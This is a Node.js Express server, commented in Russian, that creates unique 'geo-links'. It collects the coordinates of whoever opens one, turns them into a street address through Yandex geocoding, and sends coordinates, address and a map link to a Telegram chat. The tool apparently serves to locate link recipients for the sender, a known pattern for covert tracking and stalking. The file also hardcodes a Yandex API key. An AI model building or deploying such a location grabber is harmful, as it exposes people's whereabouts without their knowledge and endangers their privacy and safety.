const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Куда слать уведомления

// В памяти: id -> дата генерации
const links = {};

const YANDEX_API_KEY = process.env.YANDEX_API_KEY || 'a5d4f9a9-2612-4723-8e5d-caf5ec05b971';

app.use(express.json());
app.use(express.static('public'));

// Генерация уникальной ссылки
app.post('/api/generate', (req, res) => {
  const id = crypto.randomBytes(6).toString('hex');
  links[id] = { created: Date.now() };
  res.json({ link: `/track/${id}` });
});

async function getAddressFromCoords(lat, lon) {
  const url = `https://geocode-maps.yandex.ru/1.x/?format=json&apikey=${YANDEX_API_KEY}&geocode=${lon},${lat}`;
  try {
    const resp = await fetch(url);
    const data = await resp.json();
    return data.response.GeoObjectCollection.featureMember[0].GeoObject.metaDataProperty.GeocoderMetaData.text;
  } catch {
    return 'Адрес не найден';
  }
}

// Приём координат
app.post('/api/track/:id', async (req, res) => {
  const { id } = req.params;
  const { latitude, longitude, address: clientAddress } = req.body;
  if (!links[id]) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  if (!latitude || !longitude) {
    return res.status(400).json({ error: 'No coordinates' });
  }
  let address = clientAddress;
  if (!address) {
    // Если адрес не пришёл с клиента, определяем через Яндекс
    address = await getAddressFromCoords(latitude, longitude);
  }
  // Отправка в Telegram
  const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nАдрес: ${address}\nhttps://yandex.ru/maps/?ll=${longitude}%2C${latitude}&z=16`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text
    })
  });
  res.json({ ok: true });
});

// Отдача frontend
app.get('/track/:id', (req, res) => {
  if (!links[req.params.id]) {
    return res.status(404).send('Ссылка не найдена или устарела');
  }
  res.sendFile(__dirname + '/public/track.html');
});

app.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
}); 